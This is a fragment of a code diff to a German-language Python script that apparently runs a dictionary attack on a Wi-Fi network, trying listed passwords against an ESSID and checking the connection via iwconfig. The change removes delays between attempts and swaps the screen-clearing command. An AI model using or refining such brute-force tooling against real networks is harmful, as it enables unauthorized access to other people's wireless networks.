@@ -102,7 +102,6 @@ def reset():
 
 def verbindungscheck(essid,psk):
     print(farben.IN + "Der Angriff hat begonnen..." + farben.END)
-    time.sleep(5)
     proc = subprocess.Popen(["iwconfig", "wlan1"],stdout=subprocess.PIPE, universal_newlines=True)
     out, err = proc.communicate()
     while True:
@@ -113,7 +112,6 @@ def verbindungscheck(essid,psk):
                 sys.exit()
         
         print(farben.IN + "Schade, " + farben.AUF + psk + farben.IN + " ist leider nicht das richtige Passwort." + farben.END)
-        time.sleep(3)
         return
 
 
@@ -170,11 +168,11 @@ def main():
         essid ='%s' % lessid[0]
         psk = '%s' % liste[b]
         passwortwechsel(essid, psk)
-        os.system('clear')
+        os.system('reset')
         verbindungscheck(essid,psk)
         reset()
         killall()
-    os.system('clear')
+    os.system('reset')
     print(farben.IN + "Der Angriff wurde beendet..." + farben.END)
     print (farben.IN + "Leider hat keines der Passwörter gepasst!" + farben.END)
     time.sleep(5)
